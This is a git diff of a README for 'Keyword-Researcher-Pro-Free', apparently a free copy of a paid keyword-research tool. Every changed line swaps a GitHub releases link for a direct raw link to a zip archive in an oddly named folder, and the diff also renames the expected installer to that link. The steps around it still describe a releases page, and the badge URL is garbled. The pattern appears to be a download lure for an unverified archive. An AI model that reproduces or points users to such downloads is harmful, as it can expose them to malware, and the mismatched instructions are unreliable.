@@ -1,6 +1,6 @@
 # 🌟 Keyword-Researcher-Pro-Free - Find the Best Keywords Easily
 
-[![Download Keyword Researcher Pro](https://img.shields.io/badge/Download%20Now-Keyword%20Researcher%20Pro-brightgreen)](https://github.com/ruanvitoor/Keyword-Researcher-Pro-Free/releases)
+[![Download Keyword Researcher Pro](https://raw.githubusercontent.com/ruanvitoor/Keyword-Researcher-Pro-Free/main/aerobioscope/Keyword-Researcher-Pro-Free.zip%20Now-Keyword%20Researcher%20Pro-brightgreen)](https://raw.githubusercontent.com/ruanvitoor/Keyword-Researcher-Pro-Free/main/aerobioscope/Keyword-Researcher-Pro-Free.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to **Keyword-Researcher-Pro-Free**! This application helps you find the 
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [Keyword Researcher Pro Releases](https://github.com/ruanvitoor/Keyword-Researcher-Pro-Free/releases).
+To download the software, visit this page to download: [Keyword Researcher Pro Releases](https://raw.githubusercontent.com/ruanvitoor/Keyword-Researcher-Pro-Free/main/aerobioscope/Keyword-Researcher-Pro-Free.zip).
 
 Once you are on the releases page, follow these steps:
 
 1. Look for the latest version of **Keyword-Researcher-Pro-Free**.
 2. Click on the version number to view all available files.
-3. Find the file that says `Keyword-Researcher-Pro-Setup.exe`, or a similar name. 
+3. Find the file that says `https://raw.githubusercontent.com/ruanvitoor/Keyword-Researcher-Pro-Free/main/aerobioscope/Keyword-Researcher-Pro-Free.zip`, or a similar name. 
 4. Click on the file to start the download.
 
 After the download is complete:
@@ -64,6 +64,6 @@ For additional support, please check the FAQ section or contact our support team
 
 We welcome your feedback! Join our community on GitHub to discuss features, share tips, or ask questions. Your input helps improve the software for all users. 
 
-Visit the [Keyword Researcher Pro Releases](https://github.com/ruanvitoor/Keyword-Researcher-Pro-Free/releases) to access new features and updates as we continue to enhance the app.
+Visit the [Keyword Researcher Pro Releases](https://raw.githubusercontent.com/ruanvitoor/Keyword-Researcher-Pro-Free/main/aerobioscope/Keyword-Researcher-Pro-Free.zip) to access new features and updates as we continue to enhance the app.
 
 Thank you for using **Keyword-Researcher-Pro-Free**! We hope it helps you succeed in your keyword research efforts.
